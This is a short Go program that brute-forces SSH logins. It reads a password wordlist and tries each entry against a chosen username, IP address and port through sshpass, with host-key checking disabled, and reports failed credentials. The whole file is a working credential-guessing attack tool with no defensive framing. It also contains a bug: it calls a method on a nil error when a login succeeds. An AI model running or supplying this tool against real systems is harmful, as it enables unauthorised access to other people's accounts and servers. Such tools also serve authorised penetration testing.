package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func for_spesific_user() {
	var password string
	var spesific_user string
	var choice string
	var ip_adddresss string

	fmt.Print("Enter the password wordlist path: ")
	fmt.Scan(&password)

	fmt.Print("Enter the spesific user name: ")
	fmt.Scan(&spesific_user)

	fmt.Print("Enter the ip adress: ")
	fmt.Scan(&ip_adddresss)
	fmt.Print("SSH service is running on default port[Y][N]: ")
	fmt.Scan(&choice)

	if strings.ToLower(choice) == "y" {
		file, errr := os.Open(password)
		if errr != nil {
			log.Fatal(errr)

		}
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			trying := scanner.Text()
			cmd := exec.Command("sshpass", "-p", trying, "ssh", "-o", "StrictHostKeyChecking=no", spesific_user+"@"+(ip_adddresss), "-p", "22")
			cmd.Stdin = os.Stdin
			cmd.Stdout = os.Stdout
			err := cmd.Run()
			if strings.Contains(err.Error(), "exit status 5") || strings.Contains(err.Error(), "Permission denied") {
				fmt.Println("\n" + "Bad Credentials------------>" + spesific_user + "/" + trying)
			}
		}
	} else if strings.ToLower(choice) == "n" {

		var port int

		fmt.Print("Enter the specisific ssh port number: ")
		fmt.Scan(&port)

		file, errr := os.Open(password)
		if errr != nil {
			log.Fatal(errr)

		}
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			trying := scanner.Text()
			cmd := exec.Command("sshpass", "-p", trying, "ssh", "-o", "StrictHostKeyChecking=no", spesific_user+"@"+ip_adddresss, "-p", strconv.Itoa(port))
			cmd.Stdin = os.Stdin
			cmd.Stdout = os.Stdout
			err := cmd.Run()
			if strings.Contains(err.Error(), "exit status 5") || strings.Contains(err.Error(), "Permission denied") {
				fmt.Println("\n" + "Bad Credentials------------>" + spesific_user + "/" + trying)
			}
		}

	} else {
		fmt.Println("Wrong Answer")
		os.Exit(1)
	}

}

func main() {
	for_spesific_user()
}
